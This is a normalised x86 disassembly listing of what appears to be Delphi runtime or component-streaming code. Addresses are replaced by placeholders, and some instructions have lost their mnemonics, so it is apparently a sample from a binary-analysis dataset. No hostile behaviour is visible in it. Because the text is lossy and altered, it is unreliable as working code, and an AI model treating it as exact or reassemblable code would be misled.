mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4189b0
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_41be50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418d74
mov edi eax
xor eax eax
push ebp
push sub_41beeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
mov edx ebx
mov eax edi
call sub_4189b0
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4188a0
mov eax esi
call sub_4032b0
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408020
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41befc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418d74
mov edi eax
xor eax eax
push ebp
push sub_41bf73
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
mov edx ebx
mov eax edi
call sub_4189b0
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4188a0
mov eax esi
call sub_4032b0
sub_41bfa4
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
pop ecx
pop edx
pop ebx
retn
sub_41bfe8
push ebx
push esi
push edi
call sub_403664
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b928
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41c024
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41defc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41e00c
call sub_41bf98
sub_41c048
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408020
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_4040ac
sub_41c07c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408020
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41defc
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c13d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c4c0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c4c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c144
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41e00c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41bf98
sub_41c16c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41c18c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404348
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_40351c
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41bf98
sub_41c1f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418d74
mov esi eax
xor edx edx
push ebp
push sub_41c264
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c26b
mov eax [ rw-data ]
call sub_418dd8
retn
mov edx ebx
mov eax esi
call sub_4189b0
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4032b0
mov edx ebx
mov eax esi
call sub_4188a0
sub_41c270
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c37f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c386
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
xor edx edx
push ebp
push sub_41c362
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c3b4
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41ba84
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4189b0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404144
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41bb60
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4189b0
call sub_41c1f4
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4189b0
mov edx eax
mov eax [ rw-data ]
call sub_418cec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_418afc
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41c390
push ebx
mov ebx eax
mov eax ebx
call sub_41c484
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41ae88
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41c3b4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4032b0
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4189b0
call sub_4032b0
inc edi
dec esi
jne r-xdata
sub_41c3f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031f8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417e3c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40323c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417eb4
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417db4
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403214
test al al
jne r-xdata
sub_41c4c0
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41c50c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41c50c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_41c55c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c5a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dd5c
mov eax [ ebp - 0x4 ]
call sub_40436c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c5ae
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
call sub_41bf98
sub_41c5b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c654
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c158
test al al
jne r-xdata
mov eax ebx
call sub_41c158
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41964c
jmp r-xdata
mov eax ebx
call sub_41c49c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41d0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c65b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419580
mov esi eax
mov eax ebx
call sub_41d0bc
jmp r-xdata
mov eax ebx
call sub_41d00c
mov eax ebx
call sub_41c158
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d228
mov eax ebx
call sub_41d0c4
sub_41c684
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418854
inc esi
dec ebx
jne r-xdata
sub_41c6c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_421994
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050d0
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov edx ebx
mov eax edi
call sub_421968
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050d0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_421968
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c738
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050d0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c7a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c7c0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40277c
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c7a0
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41e1f0
call sub_40277c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4032b0
sub_41c820
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c906
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e390
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c8da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c90b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c7c0
pop ecx
test al al
jne r-xdata
call sub_403ae0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a8c
sub_41c930
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c9a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_4034ac
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_418370
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c9ad
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c7c0
pop ecx
test al al
jne r-xdata
call sub_403ae0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a8c
sub_41c9d0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41ca4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e390
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_4034ac
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ca50
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c7c0
pop ecx
test al al
jne r-xdata
call sub_403ae0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a8c
sub_41ca74
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41cc95
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41dd20
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41dd20
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41cc65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41cc23
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c6c0
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c738
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c820
pop ecx
push ebp
call sub_41c9d0
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c930
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403b10
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c738
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c738
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc9c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405298
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_4034ac
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418a0c
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c684
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418854
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c684
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418854
sub_41cc28
push ebp
call sub_41c7a0
pop ecx
test al al
je r-xdata
call sub_403a8c
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4032b0
sub_41ccb0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cd20
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41cd0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cd20
mov eax [ ebp - 0x4 ]
call sub_41c270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c3b4
retn
sub_41cd20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c158
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d228
mov eax [ ebp - 0x4 ]
call sub_41d0c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4034ac
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41cde2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4034ac
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c158
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ca74
mov eax [ ebp - 0x4 ]
call sub_41d0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cde9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41cdf0
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41defc
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d078
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c4c0
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41ce34
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41defc
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d078
mov [ esp + 0x4 ] eax
